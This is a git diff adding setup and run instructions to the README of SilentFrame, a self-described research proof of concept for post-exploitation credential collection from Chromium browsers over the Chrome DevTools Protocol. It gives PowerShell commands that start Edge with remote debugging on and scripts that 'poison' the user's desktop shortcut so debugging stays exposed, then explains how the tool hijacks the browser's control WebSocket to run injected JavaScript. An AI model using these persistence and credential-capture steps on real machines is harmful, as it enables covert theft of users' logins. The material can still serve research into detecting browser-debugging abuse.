@@ -9,6 +9,42 @@ A Research POC on Post-Exploitation Credential Collection through Chromium Brows
 #### SilentFrame  
 <img width="975" height="379" alt="image" src="https://github.com/user-attachments/assets/18ed6f76-44d5-475a-845e-66acc3239b61" />
 
+## Setup
+
+Since SilentFrame requires CDP to be running you must either execute the Chroumium based browser with the debugger flag like so:
+```powershell
+& "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"   --remote-debugging-port=9222
+```
+
+or poison the .lnk aka the shortcut file
+
+Multi Lined
+```PowerShell
+$wsh = New-Object -ComObject WScript.Shell
+$sc  = $wsh.CreateShortcut("$env:USERPROFILE\Desktop\Microsoft Edge.lnk")
+$sc.TargetPath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+$sc.Arguments  = "--remote-debugging-port=9222"
+$sc.Save()
+```
+
+One-Line
+```powershell
+$sc=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\Microsoft Edge.lnk");$sc.Arguments=($sc.Arguments+" --remote-debugging-port=9222").Trim();$sc.Save()
+```
+
+
+#### To Run
+```Powershell
+./SilentFrame 
+```
+If you want to change the JavaScript being run can use the `-Js` flag 
+If you want to change the debugging port you can use the `-Port` flag
+
+> [!IMPORTANT]
+> Due to the nature of this script we intentionally neutered the capabilites to not work within multi‑step login flows like those found on Gmail or O365 login to prvent 
+
+
+
 ## How It Works
 
 SilentFrame works by initally querying `http://127.0.0.1:9222/json/version`, which is the CDP discovery endpoint exposed by the browser when remote debugging is enabled. This endpoint returns metadata about the running browser instance, including the `webSocketDebuggerUrl`, which represents the browser’s primary control channel. It then establishes a single browser-level WebSocket connection to this endpoint rather than opening a per-tab connection, enabling it to operate as a centralized observer and controller.
